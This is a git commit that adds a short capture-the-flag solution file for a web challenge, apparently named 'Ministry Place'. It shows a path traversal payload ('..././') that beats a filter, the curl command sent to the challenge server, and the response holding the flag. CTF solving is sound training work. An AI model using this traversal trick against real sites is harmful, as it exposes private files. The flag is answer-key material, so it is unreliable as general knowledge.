7bc1d1cab09955574b5151d5ff00a015981af1ae
Neptunian <neptunian.hacker@gmail.com>
2021-04-28 23:43:00 -0300

    web_ministryplace

---
+++ web_ministryplace/solution.sh
@@ -0,0 +1,25 @@
+payload:
+..././
+
+pages/../flag
+
+$ curl http://139.59.190.72:31642/?lang=..././..././flag
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   491    0   491    0     0   1158      0 --:--:-- --:--:-- --:--:--  1160<html>
+    <header>
+        <meta name='author' content='bertolis, makelaris'>
+        <title>Ministry of Defence</title>
+        <link rel="stylesheet" href="/static/css/main.css">
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
+    </header>
+
+    <body>
+    <div class="language">
+        <a href="?lang=en.php">EN</a>
+        <a href="?lang=qw.php">QW</a>
+    </div>
+
+    CHTB{b4d_4li3n_pr0gr4m1ng}
+    </body>
+</html>
